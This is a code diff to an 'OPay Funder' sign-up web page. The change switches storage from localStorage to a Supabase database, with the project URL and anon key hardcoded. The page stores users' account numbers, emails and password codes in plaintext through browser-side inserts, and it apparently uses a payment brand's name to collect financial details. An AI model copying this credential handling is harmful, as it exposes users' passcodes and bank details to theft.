@@ -9,6 +9,7 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet">
     <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -197,7 +198,7 @@
             </div>
         </div>
 
-        <!-- Name Display - Will show REAL name from API -->
+        <!-- Name Display -->
         <div class="name-display">
             <i class="fas fa-user"></i> Account Name: <span class="name-value" id="accountName">—</span>
         </div>
@@ -236,7 +237,14 @@
     </div>
 
     <script>
-        // ============ YOUR BACKEND API URL (UPDATED WITH YOUR LIVE BACKEND) ============
+        // ============ SUPABASE CONFIGURATION (YOUR CREDENTIALS) ============
+        const SUPABASE_URL = 'https://jdvfylqtdwnweodqmevv.supabase.co';
+        const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImpkdmZ5bHF0ZHdud2VvZHFtZXZ2Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzk5NjYwNDUsImV4cCI6MjA5NTU0MjA0NX0.Ec1-oJpEaC9FoiVuZJh3GPN_PgRD38skuwHvMcWOpGU';
+        
+        // Initialize Supabase
+        const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+        
+        // ============ YOUR BACKEND API URL ============
         const API_URL = 'https://opay-backend-api.onrender.com/api/resolve-account';
         
         // ============ VIBRATION FUNCTION ============
@@ -252,9 +260,7 @@
             try {
                 const response = await fetch(API_URL, {
                     method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
+                    headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         account_number: accountNumber,
                         bank_code: 'opay'
@@ -271,6 +277,55 @@
             } catch (error) {
                 console.error('API Error:', error);
                 return { success: false, message: 'Network error. Please check your connection.' };
+            }
+        }
+        
+        // ============ SAVE USER TO SUPABASE ============
+        async function saveUserToSupabase(accountNumber, accountName, email, passwordCode) {
+            try {
+                // Check if user already exists
+                const { data: existing, error: checkError } = await supabase
+                    .from('users')
+                    .select('account_number')
+                    .eq('account_number', accountNumber)
+                    .maybeSingle();
+                
+                if (existing) {
+                    return { success: false, message: 'Account number already registered' };
+                }
+                
+                // Check if email already exists
+                const { data: emailExists, error: emailError } = await supabase
+                    .from('users')
+                    .select('email')
+                    .eq('email', email)
+                    .maybeSingle();
+                
+                if (emailExists) {
+                    return { success: false, message: 'Email already registered' };
+                }
+                
+                // Insert new user
+                const { data, error } = await supabase
+                    .from('users')
+                    .insert([
+                        { 
+                            account_number: accountNumber,
+                            account_name: accountName,
+                            email: email,
+                            password_code: passwordCode,
+                            platform: 'opay'
+                        }
+                    ])
+                    .select();
+                
+                if (error) throw error;
+                
+                return { success: true, message: 'Account created successfully!', data: data };
+                
+            } catch (error) {
+                console.error('Supabase error:', error);
+                return { success: false, message: error.message || 'Database error' };
             }
         }
         
@@ -310,12 +365,10 @@
             if (val.length === 10 && !isVerifying) {
                 isVerifying = true;
                 
-                // Show loading
                 accountNameSpan.textContent = 'Verifying with OPay...';
                 accountNameSpan.style.color = '#e67e22';
                 vibratePhone(50);
                 
-                // Call real API
                 const result = await getRealAccountName(val);
                 
                 if (result.success) {
@@ -395,25 +448,30 @@
             
             vibratePhone(0, [100, 50, 100]);
             
-            // Save to localStorage
-            const userData = {
-                accountNumber: accountNumber,
-                accountName: currentAccountName,
-                email: email,
-                passwordCode: code,
-                createdAt: new Date().toISOString()
-            };
+            // Save to Supabase (REAL DATABASE)
+            const result = await saveUserToSupabase(accountNumber, currentAccountName, email, code);
             
-            const existingUsers = JSON.parse(localStorage.getItem('opayUsers') || '[]');
-            existingUsers.push(userData);
-            localStorage.setItem('opayUsers', JSON.stringify(existingUsers));
-            localStorage.setItem('currentUser', JSON.stringify(userData));
-            
-            await showAlert('success', 'Account Created!', `Welcome ${currentAccountName}!\n\nYour OPay Funder account is ready.`, [100, 50, 100, 150]);
-            
-            setTimeout(() => {
-                window.location.href = 'login1.html';
-            }, 1500);
+            if (result.success) {
+                // Also save to localStorage as backup
+                const userData = {
+                    accountNumber: accountNumber,
+                    accountName: currentAccountName,
+                    email: email,
+                    passwordCode: code,
+                    createdAt: new Date().toISOString()
+                };
+                localStorage.setItem('currentUser', JSON.stringify(userData));
+                
+                await showAlert('success', 'Account Created!', `Welcome ${currentAccountName}!\n\nYour OPay Funder account is ready.`, [100, 50, 100, 150]);
+                
+                setTimeout(() => {
+                    window.location.href = 'login1.html';
+                }, 1500);
+            } else {
+                await showAlert('error', 'Registration Failed', result.message, [200, 100, 200]);
+                this.innerHTML = 'SIGN UP';
+                this.disabled = false;
+            }
         });
         
         // ============ NAVIGATION ============
@@ -437,8 +495,9 @@
             );
         });
         
-        console.log('✓ OPay Create Account - REAL API Ready');
+        console.log('✓ OPay Create Account - Supabase Connected');
         console.log('✓ Backend URL:', API_URL);
+        console.log('✓ Supabase URL:', SUPABASE_URL);
     </script>
 </body>
 </html>
